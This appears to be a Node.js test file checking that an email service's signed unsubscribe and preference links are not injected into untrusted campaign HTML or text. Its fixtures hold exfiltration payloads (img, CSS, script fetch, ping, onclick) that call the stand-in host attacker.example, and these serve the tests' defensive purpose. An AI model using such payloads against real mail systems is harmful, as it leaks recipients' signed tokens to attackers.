import test from 'node:test';
import assert from 'node:assert/strict';

import { sendEmail, replacePlaceholders } from './emailService.js';

const PREFERENCES_URL = 'https://tenant.example.test/email-preferences?t=recipient-campaign-token';

async function deliver({ html, text }) {
  let payload = null;
  const result = await sendEmail({
    to: 'recipient@example.test',
    subject: 'Campaign security fixture',
    html,
    text,
    tenantId: 'tenant-fixture',
    skipFooter: true,
    campaignPreferences: { preferencesUrl: PREFERENCES_URL },
    resolveTransactionalPreferences: false,
  }, {
    client: {
      messages: {
        create: async (_domain, message) => {
          payload = message;
          return { id: '<campaign-security-fixture>' };
        },
      },
    },
    getTenantEmailConfig: async () => null,
    defaultDomain: 'mail.example.test',
    defaultFrom: 'Fixture <noreply@example.test>',
  });
  assert.equal(result.success, true);
  assert.ok(payload);
  return payload;
}

test('final campaign transport never signs preference aliases injected into unsafe member HTML or text', async () => {
  const injected = [
    '<img src="https://attacker.example/collect?image={{unsubscribe_url}}">',
    '<div style="background:url(https://attacker.example/collect?css={{communication_preferences_url}})">Unsafe</div>',
    '<style>.x{background:url(https://attacker.example/collect?style={{unsubscribe_url}})}</style>',
    '<script>fetch("https://attacker.example/collect?script={{communication_preferences_url}}")</script>',
    '<!-- https://attacker.example/collect?comment={{unsubscribe_link}} -->',
    '<p>https://attacker.example/collect?text={{communication_preferences_url}}</p>',
  ].join('');
  const html = replacePlaceholders(
    '<main>Member content: {{member.payload}}</main>',
    'member',
    { payload: injected },
    {},
  );

  const payload = await deliver({
    html,
    text: 'https://attacker.example/collect?text={{unsubscribe_url}}',
  });

  assert.doesNotMatch(payload.html + payload.text, /\{\{\s*(?:unsubscribe|communication_preferences)_/i);
  assert.doesNotMatch(payload.html, new RegExp(`attacker\\.example[^"'\\s<]*${PREFERENCES_URL.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
  assert.match(payload.html, /Communication preferences unavailable/);
  assert.match(payload.text, /Communication preferences unavailable/);

  // Unsafe occurrences do not count as usable. The only signed destinations
  // are the independently appended safe HTML and plain-text fallbacks.
  assert.equal((payload.html.match(/email-preferences\?t=recipient-campaign-token/g) || []).length, 1);
  assert.equal((payload.text.match(/email-preferences\?t=recipient-campaign-token/g) || []).length, 1);
  assert.match(payload.html, new RegExp(`<a href="${PREFERENCES_URL.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"`));
  assert.match(payload.text, new RegExp(`Manage email preferences: ${PREFERENCES_URL.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`));
});

test('safe standalone campaign anchors resolve once and lose exfiltration hooks', async () => {
  const payload = await deliver({
    html: '<a href="{{communication_preferences_link}}" ping="https://attacker.example" onclick="steal(this.href)">Preferences</a>',
    text: 'Preferences:\n{{communication_preferences_url}}\n',
  });

  assert.equal((payload.html.match(/email-preferences\?t=recipient-campaign-token/g) || []).length, 1);
  assert.equal((payload.text.match(/email-preferences\?t=recipient-campaign-token/g) || []).length, 1);
  assert.doesNotMatch(payload.html, /\b(?:ping|onclick)=/i);
  assert.doesNotMatch(payload.html + payload.text, /Communication preferences unavailable|\{\{/);
});